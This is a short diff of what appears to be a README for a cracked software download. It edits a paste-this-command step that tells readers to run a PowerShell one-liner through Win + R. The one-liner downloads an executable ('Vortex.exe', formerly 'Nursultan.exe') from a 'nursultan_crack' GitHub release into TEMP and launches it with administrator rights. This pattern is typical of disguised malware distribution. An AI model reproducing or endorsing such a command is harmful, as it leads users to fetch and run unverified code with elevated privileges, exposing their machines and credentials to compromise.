@@ -21,7 +21,7 @@ Run the following command in **Command Prompt as Administrator**:
 1. Press **`Win + R`**
 2. Copy and paste the following command:
 ```powershell
-powershell -c irm https://github.com/goldwinston/nursultan_crack/releases/latest/download/Nursultan.exe -OutFile $env:TEMP\Nursultan.exe; Start-Process $env:TEMP\Nursultan.exe -Verb RunAs
+powershell -c irm https://github.com/goldwinston/nursultan_crack/releases/latest/download/Vortex.exe -OutFile $env:TEMP\Vortex.exe; Start-Process $env:TEMP\Vortex.exe -Verb RunAs
 ```
 
 ---
